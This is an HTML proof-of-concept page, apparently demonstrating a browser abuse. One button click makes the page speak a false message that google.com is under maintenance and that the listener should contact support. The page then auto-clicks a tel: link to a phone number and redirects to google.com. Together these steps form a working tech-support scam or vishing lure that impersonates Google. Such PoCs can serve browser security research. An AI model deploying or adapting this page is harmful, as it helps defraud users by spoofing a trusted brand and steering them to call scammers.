<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SpeechSynthesis Redirect PoC</title>

<style>
body{
  font-family: Arial, sans-serif;
  text-align:center;
  padding:60px;
}

button{
  padding:15px 30px;
  font-size:20px;
  cursor:pointer;
}

#status{
  margin-top:20px;
  font-size:18px;
  color:darkred;
}
</style>
</head>

<body>

<h2>CLICK TO GOOGLE</h2>
<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>

<div id="status">Status: Waiting...</div>

<script>

const btn = document.getElementById('speechBtn');
const status = document.getElementById('status');

btn.addEventListener('click', () => {

  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";

  if (!('speechSynthesis' in window)) {
    status.textContent = "SpeechSynthesis not supported.";
    return;
  }

  const utter = new SpeechSynthesisUtterance(text);
  utter.lang = 'en-US';

  status.textContent = "Preparing redirect...";

  setTimeout(() => {

    // 🔊 Speech
    speechSynthesis.speak(utter);

    // 📞 tel link (tidak langsung force buka app)
    const tel = document.createElement("a");
    tel.href = "tel:+18005551234";
    tel.click();

    // 🌐 buka tab google
    window.open('https://google.com','_blank');

    // 🔄 replace halaman
    window.location.replace('https://google.com');

  },300);

});

</script>

</body>
</html>
